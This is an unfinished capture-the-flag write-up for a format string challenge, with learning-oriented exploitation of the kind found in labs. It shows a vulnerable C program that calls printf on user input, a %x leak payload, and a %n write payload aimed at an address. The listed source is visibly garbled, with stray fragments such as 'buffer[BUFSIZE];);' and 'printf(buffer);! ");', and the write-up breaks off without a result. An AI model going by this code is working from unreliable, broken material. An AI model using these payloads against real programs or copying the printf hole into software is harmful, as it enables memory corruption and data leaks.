# Binary Exploitation

Challenge Name : Format String

# Solution

First let's review the source code.

```c++
#include <stdio.h>                                                                                                                                                                              
#include <stdlib.h>                                                                                                                                                                             
#include <string.h>                                                                                                                                                                             
#include <sys/types.h>                                                                                                                                                                          
                                                                                                                                                                                                
                                                                                                                                                                                                
#define FLAGSIZE 128                                                                                                                                                                            
#define BUFSIZE 64                                                                                                                                                                              
void vuln()                                                                                                                                                                                     
                                                                                                                                                                                                
{                                                                                                                                                                                               
        char flag[FLAGSIZE];                                                                                                                                                                    
        FILE *f = fopen("flag.txt","r");                                                                                                                                                        
        char buffer[BUFSIZE];);                                                                                                                                                                 
                                                                                                                                                                                                
                                                                                                                                                                                                
        printf("What's is your name? ");
        fgets(buffer, BUFSIZE, stdin);
        printf(buffer);! ");
                                                                                                                                                                                                
        printf("Now what?");
}                                                                                                                                                                                               
                                                                                                                                                                                                
int main(int argc, char **argv)      
{                                                                                                                                                          
                                                                                                                                                                                                
        setvbuf(stdout, NULL, _IONBF, 0);                                                                                                                                                       
        gid_t gid = getegid();                                                                                                                                                                  
        setresgid(gid, gid, gid);                                                                                                                                                               
        printf("Now I give you a vulnerable function\n");ity\n");                                                                                                                               
                                                                                                                                                                                                
        printf("Can you leak the flag out?\n");                                                                                                                                                 
                                                                                                                                                                                                
        vuln();                                                                                                                                                                                 
}
```

This is my first time to encounter with format string. So let's learn it together. As usual we can read any article related to this vulnerability

- https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be

From the article we have learned that different **format specifiers** indicate what type of **data** it should be replaced with:

- **%d** is for signed integers in decimal
- ** %u** is for unsigned integer in decimal
- **%x** is for unsigned integer in hex
- ** %s** indicates that the data should be a pointer to a string.

Oritee so we can try to leak hex value using %x using this payload

```bash
# Python
python3 -c "print('A' * 4 + '-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')" | ./format
```

We can see that our AAAA show in index 6.

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210630212236.png)

So our simple payload will looks like this

```bash
python3 -c 'print("\x40\xa0\x04\x08%188x%6$n")' | ./format 
```

# Flag

Not complete yet will check it out later


